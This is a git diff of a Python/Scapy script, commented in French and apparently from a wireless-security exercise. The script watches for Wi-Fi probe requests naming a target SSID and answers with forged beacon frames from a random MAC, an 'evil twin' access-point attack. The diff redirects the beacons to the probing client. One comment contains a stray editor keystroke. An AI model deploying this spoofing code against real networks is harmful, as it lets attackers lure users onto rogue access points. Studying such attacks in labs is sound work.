@@ -33,7 +33,8 @@ def pkt_handler(pkt):
         #Check si c'est une probe request
         if pkt.type == 0 and pkt.subtype == 4:
             ssid = pkt[Dot11Elt].info
-            
+           
+           # Détection du SSID et lancement de l'attaqu:wqe
             if ssid.decode() == args.s:
                 print("SSID cible détectée!")
                 print("Démarrage de l'attaque")
@@ -43,10 +44,10 @@ def pkt_handler(pkt):
             
         
 
-# Fonction qui envoie un ProbeResp avec le SSID cible
+# Fonction qui envoie un Beacon avec le SSID cible 
 def evil_twin(pkt):
     random_mac = Faker().mac_address()
-    packet = RadioTap()/Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
+    packet = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
                               addr2=random_mac, addr3=random_mac)/Dot11Beacon()/Dot11Elt(ID="SSID", info=args.s, len=len(args.s))
     sendp(packet, iface=args.i, inter=0.1, loop=1, verbose=1)
 
